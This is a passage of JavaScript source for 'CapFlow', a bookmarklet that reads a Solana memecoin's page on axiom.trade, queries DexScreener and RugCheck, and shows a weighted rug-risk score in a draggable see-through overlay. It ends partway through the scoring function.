/* ═══ CapFlow · the bookmarklet ════════════════════════════════════════
   `capflow` is the whole bookmarklet. index.html serialises it into the
   javascript: URL on every "Get CapFlow" button, so this file is the one
   source of truth. It must stay self-contained (no outside variables).

   On a coin page it:
     1. finds the token address in the URL (axiom.trade/meme/<addr>) or in
        the page's links (solscan, pump.fun, dexscreener …)
     2. reads Axiom's own token-info panel (top 10, dev, snipers, insiders,
        bundlers, LP burned, holders, dex paid)
     3. pulls live data from DexScreener (price, liquidity, socials, age,
        buys/sells) and RugCheck (mint/freeze authority, LP lock, risks)
     4. searches DexScreener for the same ticker to see whether the story
        has been launched before (original vs copycat)
     5. turns that into a CapFlow score out of 10 (10 = cleanest) and shows
        it in a see-through panel over the page. Click again to close.

   If the page's security policy blocks the live lookups, the panel scores
   from what Axiom shows and offers to finish the scan on capflow.        */
(function(){
"use strict";

function capflow(HOME, ADDR, LITE){
  var D=document, W=window, ID='capflow-overlay';
  var prev=D.getElementById(ID);
  if(prev){ prev.__close ? prev.__close() : prev.remove(); if(!ADDR) return; }

  var B58=/[1-9A-HJ-NP-Za-km-z]{32,44}/g, ONE=/[1-9A-HJ-NP-Za-km-z]{32,44}/;
  var DS='https://api.dexscreener.com', RC='https://api.rugcheck.xyz';
  var RM=W.matchMedia&&W.matchMedia('(prefers-reduced-motion: reduce)').matches;
  var blocked=false;

  /* ── where is the coin? ─────────────────────────────────────────── */
  function fromUrl(){
    var m=(location.pathname+'/').match(/\/(?:meme|t|token|tokens|coin|trade|solana|address)\/([1-9A-HJ-NP-Za-km-z]{32,44})[\/?#]/);
    if(m) return m[1];
    var q=location.search.match(ONE); if(q) return q[0];
    return null;
  }
  function fromLinks(){
    var out=[];
    [].forEach.call(D.querySelectorAll('a[href]'),function(a){
      var h=a.href||''; if(!/solscan|pump\.fun|dexscreener|birdeye|gmgn|rugcheck|bullx|photon|x\.com\/search|twitter\.com\/search/.test(h)) return;
      (h.match(B58)||[]).forEach(function(x){ if(out.indexOf(x)<0) out.push(x); });
    });
    // token pages and searches point at the mint; launchpad mints end in pump/bonk/moon
    out.sort(function(a,b){ return rank(b)-rank(a); });
    return out;
  }
  function rank(x){ return /(pump|bonk|moon|boop)$/.test(x)?2:0; }

  /* ── fetch everything for one coin ── */
  function load(addr,links,cb){
    var cands=[addr].concat(links.filter(function(x){ return x!==addr; })).slice(0,30);
    Promise.all([get(DS+'/latest/dex/pairs/solana/'+addr), get(DS+'/tokens/v1/solana/'+cands.join(','))]).then(function(a){
      var pairs=[].concat((a[0]&&(a[0].pairs||(a[0].pair?[a[0].pair]:[])))||[], Array.isArray(a[1])?a[1]:[]).filter(function(p){ return p&&p.chainId==='solana'; });
      var best=null;
      pairs.forEach(function(p){ if(p.pairAddress===addr) best=best||p; });
      if(!best) pairs.forEach(function(p){ if(p.baseToken&&p.baseToken.address===addr) best=best||p; });
      if(!best) pairs.forEach(function(p){ if(!best||((p.liquidity&&p.liquidity.usd)||0)>((best.liquidity&&best.liquidity.usd)||0)) best=p; });
      var mint=best?best.baseToken.address:(cands.filter(function(x){ return rank(x); })[0]||addr);
      var sym=best&&best.baseToken.symbol, dsOk=!!(a[0]||a[1]);
      return Promise.all([get(RC+'/v1/tokens/'+mint+'/report',10000), sym?get(DS+'/latest/dex/search?q='+encodeURIComponent(sym)):null]).then(function(b){
        cb({px:best,mint:mint,rc:b[0],srch:b[1],ds:best?'ok':dsOk?'not listed':blocked?'blocked':'no answer',rcs:b[0]?'ok':blocked?'blocked':'not found',blocked:blocked});
      });
    }).catch(function(){ cb({px:null,mint:addr,rc:null,srch:null,ds:'error',rcs:'error',blocked:blocked}); });
  }

  /* ── what does Axiom already show? ──────────────────────────────── */
  var LBL={top10:/^top\s*10(\s*h(olders|\.)?)?$/i, dev:/^dev\s*h(olding|\.)?$/i, snipers:/^snipers?(\s*h(olding|\.)?)?$/i,
    insiders:/^insiders?(\s*h(olding|\.)?)?$/i, bundlers:/^bundl(ers?|ed)$/i, lp:/^lp\s*burn(ed|t)?$/i, holders:/^holders$/i, paid:/^dex\s*paid$/i,
    mc:/^(mc|mkt\.? ?cap|market ?cap)$/i, liq:/^(liq\.?|liquidity)$/i};
  function scrape(){
    var r={}, els=D.body?D.body.getElementsByTagName('*'):[], n=Math.min(els.length,20000);
    for(var i=0;i<n;i++){
      var e=els[i]; if(e.id===ID||e.children.length>3) continue;
      var t=(e.textContent||'').trim(); if(!t||t.length>20) continue;
      for(var k in LBL){
        if(r[k]!=null||!LBL[k].test(t)) continue;
        var p=e, v=null;
        for(var up=0;up<3&&v==null;up++){
          p=p.parentElement; if(!p) break;
          var rest=(p.textContent||'').replace(t,' ').trim(); if(!rest) continue; if(rest.length>48) break;
          if(k==='paid'){ if(/unpaid|\bno\b|✕|✗/i.test(rest)) v=0; else if(/paid|yes|✓|✔/i.test(rest)) v=1; continue; }
          var m=rest.match(/(\d+(?:[.,]\d+)?)\s*([kKmMbB%])?/);
          if(m){ v=parseFloat(m[1].replace(',','.')); if(/k/i.test(m[2]||'')) v*=1e3; if(/m/i.test(m[2]||'')) v*=1e6; if(/b/i.test(m[2]||'')) v*=1e9; }
        }
        if(v!=null&&isFinite(v)) r[k]=v;
      }
    }
    // the tab title usually leads with the ticker, e.g. "PEPE $12.3K | Axiom"
    var tt=(D.title||'').replace(/\s*[|·–—-]\s*axiom.*$/i,'').trim().split(/\s+/)[0]||'';
    tt=tt.replace(/^\$/,''); if(/^[A-Za-z0-9._-]{1,16}$/.test(tt)&&!/^(axiom|pulse|trade|discover)$/i.test(tt)) r.sym=tt;
    return r;
  }

  function get(u,ms){
    return new Promise(function(res){
      var done=false, t=setTimeout(function(){ if(!done){ done=true; res(null); } },ms||8000);
      function fin(v){ if(!done){ done=true; clearTimeout(t); res(v); } }
      try{ fetch(u,{credentials:'omit'}).then(function(r){ return r.ok?r.json():null; }).then(fin,function(){ blocked=true; fin(null); }); }
      catch(e){ blocked=true; fin(null); }
    });
  }

  /* ── formatting ─────────────────────────────────────────────────── */
  function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g,function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]; }); }
  function usd(n){ if(n==null||!isFinite(n)) return '—'; var a=Math.abs(n);
    return '$'+(a>=1e9?(n/1e9).toFixed(2)+'B':a>=1e6?(n/1e6).toFixed(2)+'M':a>=1e3?(n/1e3).toFixed(1)+'K':a>=1?n.toFixed(2):n.toPrecision(3)); }
  function pct(n){ return (Math.round(n*10)/10)+'%'; }
  function ago(ms){ var s=(Date.now()-ms)/1000; return s<3600?Math.max(1,Math.round(s/60))+'m':s<86400?Math.round(s/3600)+'h':Math.round(s/86400)+'d'; }
  function short(a){ return a?a.slice(0,4)+'…'+a.slice(-4):''; }

  /* ── the panel (shadow DOM, so Axiom's CSS can't touch it) ──────── */
  var KEY='capflow.glass', glass=.38;
  try{ var g=parseFloat(localStorage.getItem(KEY)); if(g>=.1&&g<=.95) glass=g; }catch(e){}
  var host=D.createElement('div'); host.id=ID;
  host.style.cssText='position:fixed;top:76px;right:18px;z-index:2147483647;width:348px;max-width:calc(100vw - 24px);';
  var root=host.attachShadow?host.attachShadow({mode:'open'}):host;
  var CSS=''+
  ':host{all:initial}*{box-sizing:border-box;margin:0;padding:0}'+
  '.p{--a:'+glass+';--ok:#4CC38A;--warn:#E3A83B;--bad:#E5675F;--cy:#5CCBEB;--c:var(--cy);position:relative;max-height:calc(100vh - 96px);overflow:auto;scrollbar-width:none;'+
    'font:13px/1.45 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Inter,sans-serif;color:#EAF1F8;letter-spacing:-.005em;'+
    'background:linear-gradient(180deg,rgba(22,24,28,var(--a)),rgba(11,12,14,calc(var(--a) + .06)));'+
    '-webkit-backdrop-filter:blur(10px) saturate(1.5);backdrop-filter:blur(10px) saturate(1.5);'+
    'border:1px solid rgba(255,255,255,.13);border-radius:16px;text-shadow:0 1px 2px rgba(0,0,0,.55);'+
    'box-shadow:0 0 0 1px rgba(0,0,0,.35),0 24px 60px -24px rgba(0,0,0,.8),inset 0 1px 0 rgba(255,255,255,.07);'+
    'transform-origin:100% 0;transition:opacity .22s cubic-bezier(.23,1,.32,1),transform .26s cubic-bezier(.23,1,.32,1),filter .22s}'+
  '.p::-webkit-scrollbar{display:none}'+
  '.p.pre{opacity:0;transform:translateY(-6px) scale(.97);filter:blur(3px)}'+
  '.p.out{opacity:0;transform:scale(.97);transition-duration:.15s}'+
  '.hd{display:flex;align-items:center;gap:8px;height:44px;padding:0 8px 0 14px;border-bottom:1px solid rgba(255,255,255,.07);cursor:grab;user-select:none;touch-action:none}'+
  '.hd:active{cursor:grabbing}.hd svg{width:17px;height:17px;flex:none;color:var(--cy)}'+
  '.hd b{font-weight:650;font-size:14.5px;letter-spacing:-.03em}.hd b i{font-style:normal;color:var(--cy)}'+
  '.st{margin-left:auto;display:flex;align-items:center;gap:6px;font:500 10px/1 ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:.08em;text-transform:uppercase;color:rgba(234,241,248,.6)}'+
  '.sp{width:10px;height:10px;border-radius:50%;border:1.5px solid rgba(255,255,255,.2);border-top-color:var(--cy);animation:r .6s linear infinite}'+
  '@keyframes r{to{transform:rotate(360deg)}}'+
  '.x{display:grid;place-items:center;width:28px;height:28px;border:0;border-radius:8px;background:none;color:rgba(234,241,248,.6);cursor:pointer;font:16px/1 system-ui;transition:background .15s,color .15s,transform .12s}'+
  '.x:hover{background:rgba(255,255,255,.08);color:#fff}.x:active{transform:scale(.94)}'+
  '.tk{display:flex;align-items:center;gap:11px;padding:14px 14px 4px}'+
  '.av{position:relative;width:38px;height:38px;flex:none;border-radius:10px;overflow:hidden;display:grid;place-items:center;font-weight:700;font-size:14px;color:#06222B;background:linear-gradient(135deg,#8ADCF2,#4A86E8)}'+
  '.av img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}'+
  '.tk .nm{min-width:0;flex:1}.tk .nm b{display:block;font-weight:650;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}'+
  '.tk .nm span{font:500 11.5px/1.4 ui-monospace,SFMono-Regular,Menlo,monospace;color:rgba(234,241,248,.62)}'+
  '.cp{border:0;background:none;color:inherit;font:inherit;cursor:pointer;text-decoration:underline dotted rgba(255,255,255,.3);text-underline-offset:3px}'+
  '.mc{text-align:right;font:600 13px/1.3 ui-monospace,SFMono-Regular,Menlo,monospace}.mc em{display:block;font-style:normal;font-size:11px;font-weight:500}'+
  '.up{color:var(--ok)}.dn{color:var(--bad)}'+
  '.sc{display:grid;grid-template-columns:auto 1fr;gap:14px;align-items:center;margin:12px 14px 4px;padding:12px;border-radius:14px;background:rgba(0,0,0,.18);border:1px solid rgba(255,255,255,.06)}'+
  '.ring{position:relative;width:76px;height:76px}.ring svg{width:76px;height:76px;transform:rotate(-90deg)}'+
  '.ring circle{fill:none;stroke-width:7;stroke-linecap:round}.ring .tr{stroke:rgba(255,255,255,.09)}'+
  '.ring .fl{stroke:var(--c);stroke-dasharray:201;stroke-dashoffset:201;transition:stroke-dashoffset .9s cubic-bezier(.23,1,.32,1),stroke .3s;filter:drop-shadow(0 0 6px var(--c))}'+
  '.ring b{position:absolute;inset:0;display:grid;place-items:center;font-weight:700;font-size:25px;letter-spacing:-.04em;font-variant-numeric:tabular-nums}'+
  '.ring b small{font-size:10px;font-weight:500;color:rgba(234,241,248,.55);margin:9px 0 0 1px;letter-spacing:0}'+
  '.ring b span{display:flex;align-items:flex-start}'+
  '.vd{display:inline-flex;align-items:center;gap:6px;height:24px;padding:0 10px;border-radius:999px;font-weight:650;font-size:12.5px;color:var(--c);background:color-mix(in srgb,var(--c) 16%,transparent);box-shadow:inset 0 0 0 1px color-mix(in srgb,var(--c) 30%,transparent)}'+
  '.why{margin-top:7px;font-size:12.5px;color:rgba(234,241,248,.78)}'+
  '.cf{margin-top:5px;font:500 10px/1.3 ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:.06em;text-transform:uppercase;color:rgba(234,241,248,.5)}'+
  '.c-ok{--c:var(--ok)}.c-warn{--c:var(--warn)}.c-bad{--c:var(--bad)}'+
  'h4{margin:12px 14px 2px;font:600 10px/1 ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:.12em;text-transform:uppercase;color:rgba(234,241,248,.5)}'+
  'ul{list-style:none;padding:0 14px}'+
  'li{display:grid;grid-template-columns:16px 82px 1fr;gap:8px;align-items:baseline;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.06);opacity:0;transform:translateY(4px);transition:opacity .25s,transform .3s cubic-bezier(.23,1,.32,1)}'+
  'li.in{opacity:1;transform:none}li:last-child{border-bottom:0}'+
  'li i{width:7px;height:7px;border-radius:50%;margin-top:4px;background:var(--k);box-shadow:0 0 8px var(--k)}'+
  'li.ok{--k:var(--ok)}li.warn{--k:var(--warn)}li.bad{--k:var(--bad)}li.na{--k:rgba(255,255,255,.25)}'+
  'li .k{font:500 10.5px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:.06em;text-transform:uppercase;color:rgba(234,241,248,.58)}'+
  'li .v{font-size:12.5px;color:#EAF1F8}li .v small{display:block;font-size:11.5px;color:rgba(234,241,248,.6)}'+
  '.note{margin:10px 14px 0;padding:10px 12px;border-radius:12px;font-size:12px;color:rgba(234,241,248,.85);background:rgba(227,168,59,.08);box-shadow:inset 0 0 0 1px rgba(227,168,59,.22)}'+
  '.note b{color:#FDE68A}.empty{padding:22px 16px 18px;font-size:13px;color:rgba(234,241,248,.85)}.empty b{display:block;font-size:15px;margin-bottom:4px;color:#fff}'+
  '.btn{display:inline-flex;align-items:center;gap:6px;height:30px;margin-top:10px;padding:0 12px;border:0;border-radius:999px;font-weight:600;font-size:12px;line-height:1;font-family:inherit;color:#06222B;background:linear-gradient(180deg,#8ADCF2,#5CCBEB);cursor:pointer;text-decoration:none;text-shadow:none;transition:transform .12s}'+
  '.btn:active{transform:scale(.96)}'+
  '.lk{display:flex;flex-wrap:wrap;gap:6px;padding:12px 14px 0}'+
  '.lk a{display:inline-flex;align-items:center;height:26px;padding:0 10px;border-radius:999px;font-size:11.5px;font-weight:500;color:rgba(234,241,248,.85);text-decoration:none;background:rgba(255,255,255,.05);box-shadow:inset 0 0 0 1px rgba(255,255,255,.09);transition:background .15s,color .15s}'+
  '.lk a:hover{background:rgba(92,203,235,.14);color:#fff}'+
  '.al{display:flex;gap:10px;align-items:flex-start;margin:6px 14px 0;padding:12px;border-radius:12px;background:rgba(0,0,0,.16);box-shadow:inset 0 0 0 1px rgba(255,255,255,.06)}'+
  '.al-dot{width:7px;height:7px;flex:none;margin-top:6px;border-radius:50%;background:rgba(255,255,255,.25)}'+
  '.al p{font-size:12.5px;color:rgba(234,241,248,.82)}.al small{display:block;margin-top:2px;font-size:11.5px;color:rgba(234,241,248,.5)}'+
  '.src{margin:10px 14px 0;font:500 10px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:rgba(234,241,248,.45)}.src b{font-weight:500}.src .y{color:var(--ok)}.src .n{color:var(--warn)}'+
  '.ft{display:flex;align-items:center;gap:10px;margin-top:12px;padding:10px 14px;border-top:1px solid rgba(255,255,255,.07);font:500 10px/1 ui-monospace,SFMono-Regular,Menlo,monospace;color:rgba(234,241,248,.5)}'+
  '.ft label{display:flex;align-items:center;gap:7px;margin-left:auto;cursor:pointer}'+
  '.ft input{width:70px;accent-color:#5CCBEB;cursor:pointer}'+
  '@media (prefers-reduced-motion:reduce){.p,li,.ring .fl{transition:opacity .15s!important;transform:none!important;filter:none!important}.sp{animation-duration:1.6s}}';

  var MARK='<svg viewBox="0 -7.65 33.7 33.7" fill="currentColor" aria-hidden="true"><ellipse cx="14" cy="1.85" rx="1.95" ry=".84" transform="rotate(-12 14 1.85)"/><path d="M.8 16.6C1 8.6 6.2 2.9 13.9 2.3L14.85 2.55L7.5 15.6Z"/><path d="M15.85 2.5C21.4 2.7 26.2 6.2 26.6 10.6L8.6 15.6Z"/><path d="M7.1 16.6C12.4 16 16.9 14.8 20.3 13.1C24.5 11 28.7 9.7 32.9 8.2C31.7 11.1 29.2 13.2 26.5 14.3C22.3 15.9 16.2 17 12.4 17.2C9.9 17.35 8.1 17 7.1 16.6Z"/></svg>';
  root.innerHTML='<style>'+CSS+'</style><div class="p pre" role="dialog" aria-label="CapFlow scan">'+
    '<div class="hd">'+MARK+'<b>Cap<i>Flow</i></b><span class="st"><span class="sp"></span><span class="stt">Scanning</span></span><button class="x" type="button" aria-label="Close CapFlow">✕</button></div>'+
    '<div class="bd"></div>'+
    '<div class="ft"><span>Not financial advice</span><label title="How see-through the panel is">Glass<input type="range" min="10" max="95" value="'+Math.round(glass*100)+'" aria-label="Panel opacity"></label></div></div>';
  (D.body||D.documentElement).appendChild(host);
  var P=root.querySelector('.p'), BD=root.querySelector('.bd'), STT=root.querySelector('.st');
  requestAnimationFrame(function(){ requestAnimationFrame(function(){ P.classList.remove('pre'); }); });

  function close(){ if(!host.isConnected) return; P.classList.add('out'); D.removeEventListener('keydown',onKey,true); setTimeout(function(){ host.remove(); },RM?0:160); }
  host.__close=close;
  function onKey(e){ if(e.key==='Escape') close(); }
  D.addEventListener('keydown',onKey,true);
  root.querySelector('.x').onclick=close;
  root.querySelector('input[type=range]').oninput=function(){ var v=this.value/100; P.style.setProperty('--a',v); try{ localStorage.setItem(KEY,v); }catch(e){} };

  // drag by the header, with pointer capture
  (function(){ var hd=root.querySelector('.hd'), sx=0, sy=0, ox=0, oy=0, on=false;
    hd.addEventListener('pointerdown',function(e){ if(e.button>0||e.target.closest('.x')) return; on=true; hd.setPointerCapture(e.pointerId);
      var r=host.getBoundingClientRect(); sx=e.clientX; sy=e.clientY; ox=r.left; oy=r.top; });
    hd.addEventListener('pointermove',function(e){ if(!on) return;
      var x=Math.max(4,Math.min(innerWidth-host.offsetWidth-4,ox+e.clientX-sx)), y=Math.max(4,Math.min(innerHeight-60,oy+e.clientY-sy));
      host.style.left=x+'px'; host.style.top=y+'px'; host.style.right='auto'; });
    hd.addEventListener('pointerup',function(){ on=false; }); hd.addEventListener('pointercancel',function(){ on=false; });
  })();

  var ALPHA='<h4>Alpha calls</h4><div class="al"><span class="al-dot"></span><p>No calls right now.<small>New calls from Potion Alpha, Serenity, Prosperity and Pastel Alpha will show up here.</small></p></div>';
  function status(t,done){ STT.innerHTML=(done?'':'<span class="sp"></span>')+'<span>'+esc(t)+'</span>'; }

  /* ── no coin on screen ──────────────────────────────────────────── */
  var addr=ADDR||fromUrl(), links=ADDR?[]:fromLinks();
  if(!addr&&links.length) addr=links[0];
  if(!addr){
    status('Idle',true);
    BD.innerHTML='<div class="empty"><b>Open a coin first</b>CapFlow reads the token page you are on. On <b style="display:inline;font-size:inherit">axiom.trade</b>, open any coin from Pulse, then click CapFlow again.</div>'+ALPHA;
    return;
  }

  BD.innerHTML='<div class="empty"><b>Scanning…</b><span style="font-family:ui-monospace,monospace">'+esc(short(addr))+'</span></div>';
  /* Always read the page. This used to be skipped whenever a mint was passed
     in, which is the normal case, so holders, liquidity and the ticker were
     always empty and the panel looked like it had no data. */
  var dom=scrape();

  var via='direct';
  function show(r){ SRC={ds:r.ds,rc:r.rcs,via:via,blocked:r.blocked}; render(r.px,r.mint,r.rc,r.srch); }
  var SRC={};

  /* Paint from the page immediately. Axiom's CSP refuses every outside origin,
     so the live lookup below never resolves there — without this the panel
     sits on "Reading the chain…" forever. The callback replaces it if the
     lookup does come back. */
  show({px:null,mint:addr,rc:null,srch:null,ds:'blocked',rcs:'blocked',blocked:true});
  load(addr,links,function(r){
    show(r);
  });

  /* The token logo already on the page. Axiom renders it in the coin header,
     and it is the only image guaranteed to be present when the live lookup is
     blocked, so it is the real source for the avatar. */
  function mintHash(x){
    var h=2166136261>>>0, i;
    for(i=0;i<x.length;i++){ h^=x.charCodeAt(i); h=Math.imul(h,16777619)>>>0; }
    return h>>>0;
  }

  /**
   * The coin's own logo, or nothing.
   *
   * A random avatar is worse than a monogram: the panel is read by someone
   * deciding whether to trust a token, and a wrong picture is an instant tell.
   * So this only returns a confident match, in order:
   *
   *   1. the page's own og:image / twitter:image, which is the token image
   *   2. an <img> whose alt text matches the symbol or the name
   *   3. the <img> inside the same block as the token heading
   *   4. the <img> closest to the token address on screen
   *
   * Anything else falls through to the monogram.
   */
  function domLogo(name, sym){
    var meta=D.querySelector('meta[property="og:image"],meta[name="twitter:image"]');
    if(meta){
      var mv=meta.getAttribute('content')||'';
      if(/^https?:/i.test(mv)) return mv;
    }

    var imgs=D.querySelectorAll('img'), i, im, alt, src, nw, nh;
    var want=[String(sym||'').toLowerCase(),String(name||'').toLowerCase()].filter(function(x){ return x&&x.length>1; });

    // 2 · alt text match
    for(i=0;i<imgs.length&&i<300;i++){
      im=imgs[i];
      alt=(im.getAttribute('alt')||'').toLowerCase().trim();
      if(!alt) continue;
      for(var w=0;w<want.length;w++){
        if(alt===want[w]||alt.indexOf(want[w])>-1){
          src=im.currentSrc||im.getAttribute('src')||'';
          if(src&&!/^data:/i.test(src)) return src;
        }
      }
    }

    // 3 · same block as the heading
    var h=D.querySelector('h1');
    if(h){
      var box=h.parentElement;
      for(var up=0;up<4&&box;up++){
        var cand=box.querySelectorAll('img');
        for(i=0;i<cand.length&&i<40;i++){
          nw=cand[i].naturalWidth||0; nh=cand[i].naturalHeight||0;
          if(nw<24||nh<24) continue;
          if(Math.min(nw,nh)/Math.max(nw,nh)<0.7) continue;
          src=cand[i].currentSrc||cand[i].getAttribute('src')||'';
          if(src&&!/^data:/i.test(src)) return src;
        }
        box=box.parentElement;
      }
    }

    return '';
  }


  /* ── score ──────────────────────────────────────────────────────
     Each check gives a 0–1 grade with a weight. The score is the
     weighted average over the checks we actually have data for, so a
     missing check never counts as clean. Then caps apply: a coin that
     is tiny, brand new, still on the bonding curve or has contract red
     flags can't score high, however clean the rest looks.             */
  function render(px,mint,rc,srch){
    var rows=[], G=[], caps=[], now=Date.now(), info=(px&&px.info)||{}, TOTALW=0;
    // k label, v value, lvl ok/warn/bad/na, sub detail, w weight, g grade 0–1, why reason when weak
    function row(k,v,lvl,sub,w,g,why){ rows.push([k,v,lvl,sub]); TOTALW+=w||0; if(lvl!=='na'&&w) G.push([w,g,why]); }
    function cap(max,why,early){ caps.push([max,why,!!early]); }
    function lv(g){ return g>=.7?'ok':g>=.4?'warn':'bad'; }

    // facts from the three sources, Axiom's own panel first
    var tok=rc&&rc.token, dec=tok&&tok.decimals!=null?tok.decimals:6, supply=tok&&tok.supply?tok.supply:0;
    var known=(rc&&rc.knownAccounts)||{};
    var mc=px?(px.marketCap||px.fdv||0):0; if(!mc&&dom.mc) mc=dom.mc;
    if(!mc&&rc&&rc.price&&supply) mc=rc.price*supply/Math.pow(10,dec);
    var born=(px&&px.pairCreatedAt)||(rc&&rc.detectedAt?Date.parse(rc.detectedAt):0);
    var curve=(px&&/^pumpfun$|bonding|launchlab/i.test(px.dexId||''))||(rc&&rc.markets&&rc.markets[0]&&/pump_fun$|bonding/i.test(rc.markets[0].marketType||''));
    var holders=dom.holders!=null?dom.holders:(rc&&rc.totalHolders!=null?rc.totalHolders:null);
    var people=((rc&&rc.topHolders)||[]).filter(function(h){ var t=known[h.owner]&&known[h.owner].type; return t!=='AMM'&&t!=='LOCKER'&&h.owner!==(px&&px.pairAddress); });
    var top10=dom.top10!=null?dom.top10:(people.length?people.slice(0,10).reduce(function(a,h){ return a+(h.pct||0); },0):null);
    var devPct=dom.dev!=null?dom.dev:(rc&&rc.creatorBalance!=null&&supply?rc.creatorBalance/supply*100:null);
    var insidersRC=rc&&rc.graphInsidersDetected&&((holders!=null&&holders<5000)||(born&&now-born<6048e5))?rc.graphInsidersDetected:0;

    if(rc&&rc.rugged) cap(0,'already rugged');

    // 1 · narrative
    if(px&&srch&&srch.pairs){
      var me=px.baseToken, b0=px.pairCreatedAt||now, older={}, n=0;
      srch.pairs.forEach(function(p){ if(p.chainId!=='solana') return; var b=p.baseToken; if(!b||b.address===me.address) return;
        var same=(b.symbol||'').toLowerCase()===(me.symbol||'').toLowerCase()||(b.name||'').toLowerCase()===(me.name||'').toLowerCase();
        if(same&&p.pairCreatedAt&&p.pairCreatedAt<b0&&!older[b.address]){ older[b.address]=1; n++; } });
      var gn=n===0?1:n<=2?.45:.1;
      if(n>2) cap(6,'the narrative was launched '+n+' times before'); else if(n>0) cap(7.5,'the narrative was launched before');
      row('Narrative',n===0?'Original':n+' earlier $'+me.symbol.replace(/^\$/,''),lv(gn),n===0?'First $'+me.symbol.replace(/^\$/,'')+' on Solana we can find':'The story was launched before',1.5,gn,'copied narrative');
    } else row('Narrative','Unchecked','na','Needs the live lookup',1.5);

    // 2 · socials (easy to add, so never worth a full grade)
    if(px){
      var so=(info.socials||[]), web=(info.websites||[]).length, x=so.filter(function(s){ return /twitter|^x$/i.test(s.type||s.platform||''); })[0], cnt=so.length+web;
      var gs=cnt>=2?.8:cnt===1?.45:0; if(!cnt) cap(6,'no socials on record');
      row('Socials',cnt?((x?'X':'')+(so.some(function(s){return /telegram/i.test(s.type||'');})?' · TG':'')+(web?' · site':'')).replace(/^ · /,''):'None listed',lv(gs),x&&x.url?x.url.replace(/^https?:\/\/(www\.)?/,''):cnt?'':'No X, Telegram or site on record',.75,gs,'no socials');
    } else row('Socials','Unchecked','na','',.75);

    // 3 · market cap + liquidity
    if(curve){
      row('Liquidity','Bonding curve','warn','Still on pump.fun, not migrated',1.5,.35,'still on the bonding curve');
      cap(5.5,'still on the bonding curve',true);
    } else if(px&&px.liquidity){
      var liq=px.liquidity.usd||0, r=mc?liq/mc:0;
      var gl=liq>=5e4&&r>=.05?1:liq>=2e4?.7:liq>=5e3?.4:.1;
      row('Liquidity',usd(liq),lv(gl),mc?pct(r*100)+' of market cap':'',1.5,gl,'thin liquidity');
    } else if(dom.liq!=null){ var gl2=dom.liq>=5e4?.9:dom.liq>=2e4?.7:dom.liq>=5e3?.4:.1;
      row('Liquidity',usd(dom.liq),lv(gl2),'from the Axiom page',1.5,gl2,'thin liquidity');
    } else row('Liquidity','Unchecked','na','',1.5);
    if(mc){ if(mc<1e4) cap(3.5,'market cap under $10K',true); else if(mc<5e4) cap(5.5,'market cap under $50K',true); else if(mc<25e4) cap(7.5,'market cap under $250K',true); }

    // 4 · holders
    if(holders!=null){ var gh=holders>=1000?1:holders>=300?.7:holders>=100?.45:.15;
      row('Holders',Math.round(holders).toLocaleString(),lv(gh),holders<100?'Very few wallets so far':'',1,gh,'very few holders'); }
    else row('Holders','Unchecked','na','',1);
    if(top10!=null){ var gt=top10<=20?1:top10<=30?.75:top10<=50?.4:.1;
      row('Top 10',pct(top10),lv(gt),'of supply, pool excluded',1.5,gt,'top wallets hold a lot'); }
    else row('Top 10','Unchecked','na','',1.5);
    if(devPct!=null){ var gd=devPct<=2?1:devPct<=5?.7:devPct<=10?.4:.1;
      row('Dev holds',pct(devPct),lv(gd),'',1,gd,'dev still holds a big bag'); }
    else row('Dev holds','Unchecked','na','',1);
    var bundle=Math.max(dom.bundlers||0,dom.insiders||0,dom.snipers||0);
    if(dom.bundlers!=null||dom.insiders!=null||dom.snipers!=null||rc){
      var gb=bundle<=10?1:bundle<=15?.7:bundle<=30?.35:.05; if(insidersRC) gb=Math.min(gb,insidersRC>2?.15:.4);
      var parts=[]; if(dom.bundlers!=null) parts.push('bundlers '+pct(dom.bundlers)); if(dom.insiders!=null) parts.push('insiders '+pct(dom.insiders)); if(dom.snipers!=null) parts.push('snipers '+pct(dom.snipers));
      if(insidersRC) parts.push(insidersRC+' insider network'+(insidersRC>1?'s':''));
      row('Wallets',gb>=.7?'Spread out':gb>=.4?'Some linked':'Bundled',lv(gb),parts.join(' · '),1.25,gb,'linked or bundled wallets');
    }

    // 5 · contract
    if(rc){
      var risks=rc.risks||[], dang=risks.filter(function(x){ return x.level==='danger'; }), warn=risks.filter(function(x){ return x.level==='warn'; });
      if(rc.mintAuthority) dang.push({name:'Mint authority still on'}); if(rc.freezeAuthority) dang.push({name:'Freeze authority still on'});
      var gc=dang.length?.1:warn.length>1?.6:1;
      row('Contract',dang.length?dang.length+' red flag'+(dang.length>1?'s':''):warn.length?warn.length+' warning'+(warn.length>1?'s':''):'No red flags',lv(gc),
        dang.concat(warn).slice(0,2).map(function(x){ return x.name; }).join(' · '),2,gc,dang.length?dang[0].name.toLowerCase():'contract warnings');
      if(dang.length) cap(3.5,dang[0].name.toLowerCase());
    } else row('Contract','Unchecked','na','RugCheck lookup unavailable',2);

    // 6 · order flow + age
    if(px){
      var h1=(px.txns&&(px.txns.h1&&px.txns.h1.buys+px.txns.h1.sells>0?px.txns.h1:px.txns.h24))||{buys:0,sells:0};
      var gf=h1.buys+h1.sells<10?.4:h1.sells>h1.buys*1.6?.15:h1.sells>h1.buys*1.15?.5:1;
      row('Flow',h1.buys+' buys · '+h1.sells+' sells',lv(gf),'Vol 24h '+usd(px.volume&&px.volume.h24),.75,gf,gf<.4?'heavy selling':'barely any trading');
    } else row('Flow','Unchecked','na','',.75);
    if(born){ var age=now-born, ga=age>=6048e5?1:age>=864e5?.8:age>=216e5?.6:age>=36e5?.4:.15;
      row('Age',ago(born),lv(ga),new Date(born).toLocaleString(),.75,ga,'very new');
      if(age<36e5) cap(5,'less than an hour old',true); else if(age<864e5) cap(7.5,'less than a day old',true); }
    else row('Age','Unchecked','na','',.75);

    // weighted average over the checks we have
    var sw=0, sg=0; G.forEach(function(x){ sw+=x[0]; sg+=x[0]*x[1]; });
    var base=sw?10*sg/sw:0, cover=TOTALW?sw/TOTALW:0;
    if(cover<.5) cap(5,'not enough data to judge',false);
